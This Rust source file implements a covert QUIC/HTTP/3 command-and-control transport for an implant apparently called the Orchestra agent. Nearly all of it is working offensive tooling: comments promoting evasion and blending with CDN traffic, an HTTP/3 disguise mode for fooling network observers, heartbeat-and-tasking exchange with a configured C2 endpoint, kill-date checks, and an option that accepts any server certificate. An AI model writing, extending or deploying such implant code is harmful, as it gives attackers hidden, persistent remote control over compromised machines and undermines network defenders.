//! QUIC (HTTP/3) covert C2 transport for the Orchestra agent.
//!
//! This module implements a QUIC-based C2 channel that tunnels framed
//! [`Message`]s over QUIC streams with TLS 1.3.  It provides UDP-based
//! transport with several operational advantages over TCP-based channels:
//!
//! # UDP-Based Evasion Benefits
//!
//! - **NAT traversal**: QUIC connection IDs allow session migration across
//!   IP/port changes without breaking the connection.
//! - **No head-of-line blocking**: Independent streams mean lost packets on
//!   one stream don't block others, improving parallel command execution.
//! - **TLS 1.3 mandatory**: No downgrade attacks possible; handshake folded
//!   into QUIC handshake for fewer round trips.
//! - **Blends with legitimate traffic**: QUIC/HTTP/3 to UDP:443 is
//!   increasingly common (Google, Cloudflare, major CDNs).
//! - **Connection migration**: Survives IP address changes (Wi-Fi ↔ cellular).
//! - **UDP blocking resilience**: If UDP is blocked, returns clear error and
//!   falls through to the next transport in the priority chain.  No TCP fallback.
//!
//! # Modes
//!
//! - **Raw QUIC streams** (default): Bidirectional QUIC streams with 4-byte
//!   length-prefix framing.  Each message opens a new stream for parallelism.
//! - **HTTP/3 compatibility** (`h3_compat = true`): C2 data is sent as
//!   HTTP/3 POST requests to a configurable path with malleable-profile headers.
//!
//! # Malleable Profile Integration
//!
//! Configured via `[malleable_profile.c2_quic]` in `agent.toml`:
//!
//! ```toml
//! [malleable_profile.c2_quic]
//! enabled = true
//! endpoint = "c2.example.com"
//! port = 443
//! alpn = "h3"
//! keepalive_secs = 30
//! idle_timeout_secs = 60
//! ```

use anyhow::{anyhow, Context, Result};
use async_trait::async_trait;
use common::config::QuicC2Profile;
use common::{CryptoSession, Message, Transport};
use quinn::Endpoint;
use sha2::Digest;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;
use subtle::ConstantTimeEq;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

// ---------------------------------------------------------------------------
// QUIC framing constants
// ---------------------------------------------------------------------------

/// 4-byte length prefix for framed messages (u32 big-endian).
const LENGTH_PREFIX_LEN: usize = 4;

/// Maximum allowed plaintext message size (16 MiB).  Messages larger than
/// this are rejected to prevent memory exhaustion attacks.
const MAX_MESSAGE_SIZE: usize = 16 * 1024 * 1024;

// ---------------------------------------------------------------------------
// TLS configuration helpers
// ---------------------------------------------------------------------------

/// Build a `rustls::ClientConfig` from the QUIC profile settings.
///
/// - If `insecure = true`: accepts any certificate (testing only).
/// - If `cert_pinning = true`: pins the server cert by SHA-256 fingerprint.
/// - If `custom_ca` is set: loads the PEM CA and uses it for verification.
/// - Otherwise: uses platform native root certificates.
fn build_tls_client_config(profile: &QuicC2Profile) -> Result<rustls::ClientConfig> {
    let crypto_provider = rustls::crypto::ring::default_provider();
    let _ = crypto_provider.install_default();

    let mut root_store = rustls::RootCertStore::empty();

    if !profile.custom_ca.is_empty() {
        // Load custom CA from PEM file.
        let ca_data =
            std::fs::read(&profile.custom_ca).with_context(|| {
                format!("failed to read custom CA from {}", profile.custom_ca)
            })?;
        let mut cursor = std::io::Cursor::new(&ca_data);
        let certs = rustls_pemfile::certs(&mut cursor)
            .collect::<Result<Vec<_>, _>>()
            .context("failed to parse custom CA PEM")?;
        for cert in certs {
            root_store.add(cert).context("failed to add custom CA cert")?;
        }
    } else {
        // Use platform native certificates.
        let native_certs = rustls_native_certs::load_native_certs();
        for cert in native_certs.certs {
            root_store.add(cert).context("failed to add native root cert")?;
        }
    }

    let mut tls_config = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    if profile.insecure && !profile.cert_pinning {
        // Dangerous: accept any certificate (testing only).
        tls_config
            .dangerous()
            .set_certificate_verifier(Arc::new(AcceptAnyCertVerifier));
        log::warn!(
            "QUIC TLS: insecure mode — accepting any server certificate (testing only)"
        );
    } else if profile.cert_pinning {
        tls_config
            .dangerous()
            .set_certificate_verifier(Arc::new(FingerprintCertVerifier {
                expected_fingerprint: profile.cert_fingerprint.clone(),
            }));
        log::debug!("QUIC TLS: certificate pinning enabled");
    }

    Ok(tls_config)
}

/// Certificate verifier that accepts any certificate (insecure / testing).
#[derive(Debug)]
struct AcceptAnyCertVerifier;

impl rustls::client::danger::ServerCertVerifier for AcceptAnyCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
    {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
    {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
        ]
    }
}

/// Certificate verifier that pins the server certificate by its SHA-256
/// fingerprint. Uses constant-time comparison to prevent timing side-channels.
#[derive(Debug)]
struct FingerprintCertVerifier {
    expected_fingerprint: String,
}

impl rustls::client::danger::ServerCertVerifier for FingerprintCertVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        let digest = sha2::Sha256::digest(end_entity.as_ref());
        let hex_fp = hex::encode(digest);
        let expected_lower = self.expected_fingerprint.to_lowercase();

        // Constant-time comparison to prevent timing side-channel attacks.
        if !bool::from(
            hex_fp
                .as_bytes()
                .ct_eq(expected_lower.as_bytes()),
        ) {
            log::error!("QUIC cert pinning: fingerprint mismatch — rejecting connection");
            return Err(rustls::Error::InvalidCertificate(
                rustls::CertificateError::UnknownIssuer,
            ));
        }
        log::debug!("QUIC cert pinning: fingerprint matched");
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
    {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
    {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
        ]
    }
}

// ---------------------------------------------------------------------------
// QuicClient — connection establishment
// ---------------------------------------------------------------------------

/// QUIC client that establishes connections to the C2 server.
///
/// Manages the local QUIC endpoint (bound to `0.0.0.0:0` for outbound)
/// and creates new connections with the configured TLS settings.
pub struct QuicClient {
    endpoint: Endpoint,
    server_addr: SocketAddr,
    server_name: String,
    alpn: Vec<Vec<u8>>,
    profile: QuicC2Profile,
}

impl QuicClient {
    /// Create a new QUIC client from the malleable profile.
    ///
    /// Binds a local UDP socket for outbound QUIC traffic and configures
    /// TLS according to the profile settings.
    pub fn new(profile: &QuicC2Profile) -> Result<Self> {
        let tls_config = build_tls_client_config(profile)?;

        let mut transport_config = quinn::TransportConfig::default();
        transport_config.keep_alive_interval(Some(Duration::from_secs(profile.keepalive_secs)));
        transport_config.max_idle_timeout(Some(
            Duration::from_secs(profile.idle_timeout_secs)
                .try_into()
                .map_err(|e| anyhow!("invalid idle timeout: {e}"))?,
        ));

        let mut client_config = quinn::ClientConfig::new(Arc::new(
            quinn::crypto::rustls::QuicClientConfig::try_from(tls_config)
                .context("failed to create QUIC TLS config")?,
        ));
        client_config.transport_config(Arc::new(transport_config));

        // Bind to any available port for outbound QUIC traffic.
        let bind_addr: SocketAddr = if cfg!(target_family = "unix") {
            "0.0.0.0:0"
        } else {
            "0.0.0.0:0"
        }
        .parse()
        .context("failed to parse QUIC bind address")?;

        let mut endpoint = Endpoint::client(bind_addr)
            .context("failed to create QUIC client endpoint (UDP may be blocked)")?;
        endpoint.set_default_client_config(client_config);

        // Resolve server address.
        let server_addr = {
            let port = profile.port;
            // Try parsing as IP:port first, then fall back to DNS resolution.
            let addr_str = format!("{}:{}", profile.endpoint, port);
            addr_str
                .parse::<SocketAddr>()
                .or_else(|_| {
                    // Try DNS resolution using std::net.
                    let host = profile.endpoint.as_str();
                    std::net::ToSocketAddrs::to_socket_addrs(&format!("{}:{}", host, port))
                        .map(|mut addrs| addrs.next().expect("at least one address"))
                        .map_err(|e| anyhow!("DNS resolution failed for {}: {}", host, e))
                })
                .context("failed to resolve QUIC server address")?
        };

        // SNI: use explicit override, server_name, or endpoint.
        let server_name = profile
            .sni
            .as_deref()
            .or_else(|| {
                if profile.server_name.is_empty() {
                    None
                } else {
                    Some(profile.server_name.as_str())
                }
            })
            .unwrap_or(&profile.endpoint)
            .to_string();

        // ALPN protocol identifiers.
        let alpn = vec![profile.alpn.as_bytes().to_vec()];

        Ok(Self {
            endpoint,
            server_addr,
            server_name,
            alpn,
            profile: profile.clone(),
        })
    }

    /// Connect to the QUIC C2 server.
    ///
    /// Performs the full QUIC + TLS 1.3 handshake. Returns a `QuicConnection`
    /// that can be used for sending and receiving framed messages.
    pub async fn connect(&self) -> Result<QuicConnection> {
        log::debug!(
            "QUIC: connecting to {} ({}) with ALPN {:?}",
            self.server_addr,
            self.server_name,
            self.alpn
                .iter()
                .map(|a| String::from_utf8_lossy(a).to_string())
                .collect::<Vec<_>>(),
        );

        let conn = self
            .endpoint
            .connect(self.server_addr, &self.server_name)?
            .await
            .context("QUIC connection failed (UDP may be blocked or server unreachable)")?;

        log::info!(
            "QUIC: connected to {} ({}), local addr: {}",
            self.server_addr,
            self.server_name,
            conn.local_ip()
                .map(|a| a.to_string())
                .unwrap_or_else(|| "<unknown>".to_string()),
        );

        Ok(QuicConnection {
            connection: conn,
            profile: self.profile.clone(),
        })
    }
}

// ---------------------------------------------------------------------------
// QuicConnection — framed message exchange
// ---------------------------------------------------------------------------

/// An established QUIC connection to the C2 server.
///
/// Supports sending and receiving framed [`Message`]s over QUIC streams.
/// Each message is sent on a new bidirectional stream, allowing parallel
/// command execution without head-of-line blocking.
pub struct QuicConnection {
    connection: quinn::Connection,
    profile: QuicC2Profile,
}

impl QuicConnection {
    /// Send a framed, encrypted message over a new bidirectional QUIC stream.
    ///
    /// Opens a fresh bidirectional stream, writes the 4-byte length-prefixed
    /// encrypted payload, and closes the stream.  The stream is closed after
    /// writing to signal end-of-data to the server.
    pub async fn send_framed(&self, ciphertext: &[u8]) -> Result<()> {
        let stream = self
            .connection
            .open_bi()
            .await
            .context("failed to open QUIC bidirectional stream")?;

        let (mut send, _recv) = stream;

        // Write length prefix (4 bytes, big-endian).
        let len = ciphertext.len() as u32;
        send.write_all(&len.to_be_bytes())
            .await
            .context("failed to write QUIC frame length prefix")?;

        // Write encrypted payload.
        send.write_all(ciphertext)
            .await
            .context("failed to write QUIC frame payload")?;

        // Gracefully close the send side.
        send.finish()
            .context("failed to close QUIC stream send side")?;

        log::debug!(
            "QUIC: sent framed message ({} bytes ciphertext) on new stream",
            ciphertext.len()
        );

        Ok(())
    }

    /// Receive a framed, encrypted message from a new bidirectional QUIC stream.
    ///
    /// Accepts an incoming bidirectional stream, reads the 4-byte length
    /// prefix, then reads the encrypted payload.
    pub async fn recv_framed(&self) -> Result<Vec<u8>> {
        let stream = self
            .connection
            .accept_bi()
            .await
            .context("failed to accept QUIC bidirectional stream")?;

        let (mut send, mut recv) = stream;

        let ciphertext = Self::read_framed_payload(&mut recv).await?;

        // Close the send side of the accepted stream (we're done with it).
        let _ = send.finish();

        Ok(ciphertext)
    }

    /// Read a framed payload from a QUIC receive stream.
    ///
    /// Reads the 4-byte length prefix, validates it, then reads the
    /// encrypted payload.
    async fn read_framed_payload(recv: &mut quinn::RecvStream) -> Result<Vec<u8>> {
        // Read length prefix.
        let mut len_buf = [0u8; LENGTH_PREFIX_LEN];
        recv.read_exact(&mut len_buf)
            .await
            .context("failed to read QUIC frame length prefix")?;
        let payload_len = u32::from_be_bytes(len_buf) as usize;

        if payload_len == 0 {
            return Err(anyhow!("QUIC frame: zero-length payload"));
        }
        if payload_len > MAX_MESSAGE_SIZE {
            return Err(anyhow!(
                "QUIC frame: payload too large ({} bytes, max {})",
                payload_len,
                MAX_MESSAGE_SIZE
            ));
        }

        // Read encrypted payload.
        let mut payload = vec![0u8; payload_len];
        recv.read_exact(&mut payload)
            .await
            .context("failed to read QUIC frame payload")?;

        log::debug!(
            "QUIC: received framed message ({} bytes ciphertext)",
            payload_len
        );

        Ok(payload)
    }

    /// Get the remote address of the QUIC connection.
    pub fn remote_addr(&self) -> SocketAddr {
        self.connection.remote_address()
    }

    /// Get the negotiated ALPN protocol, if any.
    pub fn alpn(&self) -> Option<Vec<u8>> {
        self.connection
            .handshake_data()
            .and_then(|hd| hd.downcast::<quinn::crypto::rustls::HandshakeData>().ok())
            .and_then(|hd| hd.protocol.map(|p| p.to_vec()))
    }

    /// Check if the connection is still alive.
    pub fn is_alive(&self) -> bool {
        self.connection.close_reason().is_none()
    }
}

// ---------------------------------------------------------------------------
// H3Compat — HTTP/3 compatibility mode framing
// ---------------------------------------------------------------------------

/// HTTP/3 compatibility mode wrapper for QUIC connections.
///
/// When enabled, C2 data is framed as HTTP/3 POST requests to a configurable
/// path with headers from the malleable profile. This makes QUIC traffic look
/// like standard web browsing to passive network observers.
///
/// **Note**: Full HTTP/3 implementation requires the `h3` crate. This module
/// provides a simplified framing that prepends HTTP-like headers to the QUIC
/// stream payload, which the server can parse. For true HTTP/3 interop, the
/// server must be configured to accept this framing format.
pub struct H3Compat<'a> {
    connection: &'a QuicConnection,
}

impl<'a> H3Compat<'a> {
    /// Create an H3 compatibility wrapper around an existing connection.
    pub fn new(connection: &'a QuicConnection) -> Self {
        Self { connection }
    }

    /// Send a message as an HTTP/3-compatible framed request.
    ///
    /// Opens a new bidirectional stream and writes:
    /// 1. HTTP/3 pseudo-headers (as length-prefixed binary):
    ///    - `:method: POST`
    ///    - `:path: <h3_path>`
    ///    - `:scheme: https`
    ///    - `:authority: <server_name>`
    /// 2. Additional headers from `h3_headers` in the profile.
    /// 3. A `content-length` header with the ciphertext length.
    /// 4. The encrypted payload body.
    pub async fn send_request(&self, ciphertext: &[u8]) -> Result<()> {
        let stream = self
            .connection
            .connection
            .open_bi()
            .await
            .context("H3Compat: failed to open QUIC stream")?;

        let (mut send, _recv) = stream;

        // Build the simplified H3 header block.
        let mut header_block = Vec::new();
        self.append_header(&mut header_block, ":method", "POST");
        self.append_header(
            &mut header_block,
            ":path",
            &self.connection.profile.h3_path,
        );
        self.append_header(&mut header_block, ":scheme", "https");
        self.append_header(
            &mut header_block,
            ":authority",
            &self.connection.profile.endpoint,
        );

        // Additional headers from the malleable profile.
        for (key, value) in &self.connection.profile.h3_headers {
            self.append_header(&mut header_block, key, value);
        }

        // Content-Length header.
        self.append_header(
            &mut header_block,
            "content-length",
            &ciphertext.len().to_string(),
        );

        // Write header block length (4 bytes) + header block.
        let header_len = header_block.len() as u32;
        send.write_all(&header_len.to_be_bytes())
            .await
            .context("H3Compat: failed to write header block length")?;
        send.write_all(&header_block)
            .await
            .context("H3Compat: failed to write header block")?;

        // Write the encrypted body.
        send.write_all(ciphertext)
            .await
            .context("H3Compat: failed to write request body")?;

        send.finish()
            .context("H3Compat: failed to close stream")?;

        log::debug!(
            "H3Compat: sent POST {} ({} bytes body + {} bytes headers)",
            self.connection.profile.h3_path,
            ciphertext.len(),
            header_block.len(),
        );

        Ok(())
    }

    /// Receive an HTTP/3-compatible framed response.
    ///
    /// Reads the response from an accepted bidirectional stream.
    /// Expects the same simplified framing: length-prefixed header block
    /// followed by the encrypted response body.
    pub async fn recv_response(&self) -> Result<Vec<u8>> {
        let stream = self
            .connection
            .connection
            .accept_bi()
            .await
            .context("H3Compat: failed to accept QUIC stream")?;

        let (mut send, mut recv) = stream;

        // Read header block length.
        let mut header_len_buf = [0u8; LENGTH_PREFIX_LEN];
        recv.read_exact(&mut header_len_buf)
            .await
            .context("H3Compat: failed to read response header length")?;
        let header_len = u32::from_be_bytes(header_len_buf) as usize;

        // Skip header block (server sends response headers we don't need to parse).
        if header_len > 0 {
            let mut header_buf = vec![0u8; header_len];
            recv.read_exact(&mut header_buf)
                .await
                .context("H3Compat: failed to read response headers")?;
        }

        // Read the response body (length-prefixed).
        let mut body_len_buf = [0u8; LENGTH_PREFIX_LEN];
        recv.read_exact(&mut body_len_buf)
            .await
            .context("H3Compat: failed to read response body length")?;
        let body_len = u32::from_be_bytes(body_len_buf) as usize;

        if body_len == 0 {
            return Err(anyhow!("H3Compat: zero-length response body"));
        }
        if body_len > MAX_MESSAGE_SIZE {
            return Err(anyhow!(
                "H3Compat: response body too large ({} bytes)",
                body_len
            ));
        }

        let mut body = vec![0u8; body_len];
        recv.read_exact(&mut body)
            .await
            .context("H3Compat: failed to read response body")?;

        let _ = send.finish();

        log::debug!(
            "H3Compat: received response ({} bytes body + {} bytes headers)",
            body_len,
            header_len,
        );

        Ok(body)
    }

    /// Append a header to the binary header block.
    ///
    /// Format: `key_len(2) || key || value_len(2) || value`
    fn append_header(&self, buf: &mut Vec<u8>, key: &str, value: &str) {
        let key_bytes = key.as_bytes();
        let value_bytes = value.as_bytes();
        buf.extend_from_slice(&(key_bytes.len() as u16).to_be_bytes());
        buf.extend_from_slice(key_bytes);
        buf.extend_from_slice(&(value_bytes.len() as u16).to_be_bytes());
        buf.extend_from_slice(value_bytes);
    }
}

// ---------------------------------------------------------------------------
// QuicTransport — the Transport trait implementation
// ---------------------------------------------------------------------------

/// QUIC-based C2 transport implementing the [`Transport`] trait.
///
/// Uses `quinn` (pure-Rust QUIC) to tunnel framed, encrypted [`Message`]s
/// over QUIC streams with TLS 1.3. Supports raw QUIC streams and HTTP/3
/// compatibility mode.
///
/// # Connection Lifecycle
///
/// 1. On first `send()` or `recv()`, establishes a QUIC connection to the
///    server using the configured TLS profile.
/// 2. Each message is sent on a new bidirectional QUIC stream for parallelism.
/// 3. The connection is reused across multiple send/recv cycles.
/// 4. If the connection drops, it is re-established on the next operation.
///
/// # Kill Date Enforcement
///
/// The transport checks the kill date on every `send()` and `recv()` call.
/// If the current date is at or past the kill date, the operation returns
/// an error and the agent should shut down.
pub struct QuicTransport {
    /// QUIC client for establishing connections.
    client: QuicClient,
    /// Active QUIC connection (lazy-initialized on first use).
    connection: Option<QuicConnection>,
    /// CryptoSession for encrypting/decrypting messages.
    session: CryptoSession,
    /// Agent identifier (sent in heartbeat messages).
    agent_id: String,
    /// Optional mesh public key for P2P link establishment.
    mesh_public_key: Option<[u8; 32]>,
    /// Kill date in YYYY-MM-DD format (empty = no kill date).
    kill_date: String,
    /// Whether to use HTTP/3 compatibility mode.
    h3_compat: bool,
    /// Backoff state for reconnection attempts (seconds).
    backoff_secs: u64,
    /// Maximum backoff duration (seconds).
    max_backoff_secs: u64,
}

impl QuicTransport {
    /// Maximum backoff duration in seconds.
    const MAX_BACKOFF_SECS: u64 = 64;

    /// Create a new QUIC transport from the malleable profile.
    ///
    /// # Arguments
    ///
    /// * `profile` — QUIC C2 profile from the malleable configuration.
    /// * `session` — CryptoSession for message encryption.
    /// * `agent_id` — Unique agent identifier.
    /// * `mesh_public_key` — Optional mesh public key for P2P networking.
    /// * `kill_date` — Kill date in YYYY-MM-DD format (empty = disabled).
    pub fn new(
        profile: &QuicC2Profile,
        session: CryptoSession,
        agent_id: String,
        mesh_public_key: Option<[u8; 32]>,
        kill_date: String,
    ) -> Result<Self> {
        let h3_compat = profile.h3_compat;
        let client = QuicClient::new(profile)?;

        log::info!(
            "QUIC transport initialized: endpoint={}, port={}, alpn={}, h3_compat={}",
            profile.endpoint,
            profile.port,
            profile.alpn,
            h3_compat,
        );

        Ok(Self {
            client,
            connection: None,
            session,
            agent_id,
            mesh_public_key,
            kill_date,
            h3_compat,
            backoff_secs: 1,
            max_backoff_secs: Self::MAX_BACKOFF_SECS,
        })
    }

    /// Ensure we have an active QUIC connection.
    ///
    /// If the connection is absent or dead, establishes a new one.
    /// Applies exponential backoff on repeated failures.
    async fn ensure_connected(&mut self) -> Result<()> {
        // Check if existing connection is alive.
        if let Some(ref conn) = self.connection {
            if conn.is_alive() {
                return Ok(());
            }
            log::warn!("QUIC: connection lost; reconnecting...");
            self.connection = None;
        }

        // Connect with backoff.
        let conn = self.client.connect().await?;
        self.connection = Some(conn);
        self.backoff_secs = 1; // Reset backoff on success.

        log::info!("QUIC: connection established");
        Ok(())
    }

    /// Handle a connection failure with exponential backoff.
    async fn handle_connection_failure(&mut self, e: anyhow::Error) -> anyhow::Error {
        log::warn!("QUIC: connection error: {}; backing off {}s", e, self.backoff_secs);
        self.connection = None;

        let backoff = Duration::from_secs(self.backoff_secs);
        self.backoff_secs = (self.backoff_secs * 2).min(self.max_backoff_secs);

        // Use guarded_sleep for memory-protected sleep.
        let _ = crate::memory_guard::guarded_sleep(backoff, None, 0).await;
        e
    }

    /// Record a successful operation and reset backoff.
    fn record_success(&mut self) {
        self.backoff_secs = 1;
    }

    /// Serialize, encrypt, and frame a message for QUIC transport.
    fn prepare_outbound(&self, msg: Message) -> Result<Vec<u8>> {
        let serialized = bincode::serialize(&msg)
            .context("failed to serialize message for QUIC transport")?;
        let ciphertext = self.session.encrypt(&serialized);
        Ok(ciphertext)
    }

    /// Decrypt and deserialize a received QUIC payload into a Message.
    fn process_inbound(&self, ciphertext: &[u8]) -> Result<Message> {
        let plaintext = self
            .session
            .decrypt(ciphertext)
            .map_err(|e| anyhow!("QUIC decrypt failed: {:?}", e))?;
        let msg: Message = bincode::deserialize(&plaintext)
            .context("failed to deserialize message from QUIC transport")?;
        Ok(msg)
    }
}

#[async_trait]
impl Transport for QuicTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!("QUIC C2 Send");

        // Enforce kill date on every send cycle.
        if !self.kill_date.is_empty() {
            crate::config::check_kill_date(&self.kill_date)?;
        }

        // Prepare the encrypted payload.
        let ciphertext = self.prepare_outbound(msg)?;

        // Ensure we have a connection.
        if let Err(e) = self.ensure_connected().await {
            return Err(self.handle_connection_failure(e).await);
        }

        let conn = self
            .connection
            .as_ref()
            .ok_or_else(|| anyhow!("QUIC: no connection available"))?;

        let result = if self.h3_compat {
            let h3 = H3Compat::new(conn);
            h3.send_request(&ciphertext).await
        } else {
            conn.send_framed(&ciphertext).await
        };

        match result {
            Ok(()) => {
                self.record_success();
                log::debug!("QUIC: message sent successfully ({} bytes)", ciphertext.len());
                Ok(())
            }
            Err(e) => {
                Err(self.handle_connection_failure(e).await)
            }
        }
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("QUIC C2 Recv");

        // Enforce kill date on every recv cycle.
        if !self.kill_date.is_empty() {
            crate::config::check_kill_date(&self.kill_date)?;
        }

        // Ensure we have a connection.
        if let Err(e) = self.ensure_connected().await {
            return Err(self.handle_connection_failure(e).await);
        }

        let conn = self
            .connection
            .as_ref()
            .ok_or_else(|| anyhow!("QUIC: no connection available"))?;

        // Send a heartbeat to signal the server we're ready for tasking.
        let heartbeat = Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            agent_id: self.agent_id.clone(),
            status: "idle".to_string(),
            mesh_public_key: self.mesh_public_key,
        };
        let heartbeat_ct = self.prepare_outbound(heartbeat)?;

        // Send heartbeat on a dedicated stream.
        if self.h3_compat {
            let h3 = H3Compat::new(conn);
            h3.send_request(&heartbeat_ct).await?;
        } else {
            conn.send_framed(&heartbeat_ct).await?;
        }

        // Wait for the server's response (tasking).
        let ciphertext = if self.h3_compat {
            let h3 = H3Compat::new(conn);
            h3.recv_response().await?
        } else {
            conn.recv_framed().await?
        };

        let msg = self.process_inbound(&ciphertext)?;
        self.record_success();

        log::debug!("QUIC: message received successfully");
        Ok(msg)
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn test_profile() -> QuicC2Profile {
        QuicC2Profile {
            enabled: true,
            endpoint: "127.0.0.1".to_string(),
            port: 12345,
            server_name: String::new(),
            alpn: "orchestra-test".to_string(),
            sni: None,
            cert_pinning: false,
            cert_fingerprint: String::new(),
            custom_ca: String::new(),
            insecure: true,
            keepalive_secs: 5,
            idle_timeout_secs: 10,
            h3_compat: false,
            h3_path: "/api/v1/test".to_string(),
            h3_headers: std::collections::HashMap::new(),
            max_concurrent_streams: 4,
        }
    }

    #[test]
    fn test_quic_profile_default() {
        let profile = QuicC2Profile::default();
        assert!(!profile.enabled);
        assert_eq!(profile.port, 443);
        assert_eq!(profile.alpn, "h3");
        assert_eq!(profile.keepalive_secs, 30);
        assert_eq!(profile.idle_timeout_secs, 60);
        assert!(!profile.h3_compat);
        assert_eq!(profile.max_concurrent_streams, 8);
    }

    #[test]
    fn test_fingerprint_verifier_constant_time() {
        // Ensure the FingerprintCertVerifier exists and compiles.
        let _verifier = FingerprintCertVerifier {
            expected_fingerprint: "ab".repeat(32),
        };
    }

    #[test]
    fn test_h3compat_header_encoding() {
        // Verify the header encoding format produces deterministic output.
        let mut buf = Vec::new();

        // Directly test append_header logic without needing a real connection.
        fn append_header(buf: &mut Vec<u8>, key: &str, value: &str) {
            let key_bytes = key.as_bytes();
            let value_bytes = value.as_bytes();
            buf.extend_from_slice(&(key_bytes.len() as u16).to_be_bytes());
            buf.extend_from_slice(key_bytes);
            buf.extend_from_slice(&(value_bytes.len() as u16).to_be_bytes());
            buf.extend_from_slice(value_bytes);
        }

        append_header(&mut buf, ":method", "POST");
        append_header(&mut buf, ":path", "/api/v1/test");

        // Expected: key_len(2) + key(7) + value_len(2) + value(4) + key_len(2) + key(5) + value_len(2) + value(12)
        assert_eq!(buf.len(), 36);
    }

    #[test]
    fn test_message_serialization_roundtrip() {
        let session = CryptoSession::from_shared_secret(b"test-quic-key");
        let msg = Message::Heartbeat {
            timestamp: 12345,
            agent_id: "test-agent".to_string(),
            status: "idle".to_string(),
            mesh_public_key: None,
        };

        let serialized = bincode::serialize(&msg).unwrap();
        let ciphertext = session.encrypt(&serialized);
        let plaintext = session.decrypt(&ciphertext).unwrap();
        let deserialized: Message = bincode::deserialize(&plaintext).unwrap();

        if let Message::Heartbeat {
            timestamp,
            agent_id,
            ..
        } = deserialized
        {
            assert_eq!(timestamp, 12345);
            assert_eq!(agent_id, "test-agent");
        } else {
            panic!("expected Heartbeat message");
        }
    }
}
